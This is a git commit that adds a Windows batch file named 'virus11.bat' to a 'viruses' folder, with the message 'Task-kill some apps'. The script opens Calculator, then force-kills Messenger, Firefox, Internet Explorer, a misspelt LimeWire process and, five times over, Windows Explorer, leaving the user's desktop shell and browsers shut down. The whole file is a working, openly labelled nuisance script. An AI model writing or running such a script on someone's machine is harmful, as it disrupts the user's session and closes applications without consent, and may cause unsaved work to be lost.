2028a8bb5c71debe9dce2059c6b850c044ef9d77
SparkScratch_P <prodyumna9d@gmail.com>
2022-01-17 10:19:54 -0800

    Task-kill some apps

---
+++ viruses/virus11.bat
@@ -0,0 +1,23 @@
+@echo off
+
+start calc
+
+tskill msnmsgr
+
+tskill firefox
+
+tskill iexplore
+
+tskill LimreWire
+
+tskill explorer
+
+tskill explorer
+
+tskill explorer
+
+tskill explorer
+
+tskill explorer
+
+pause
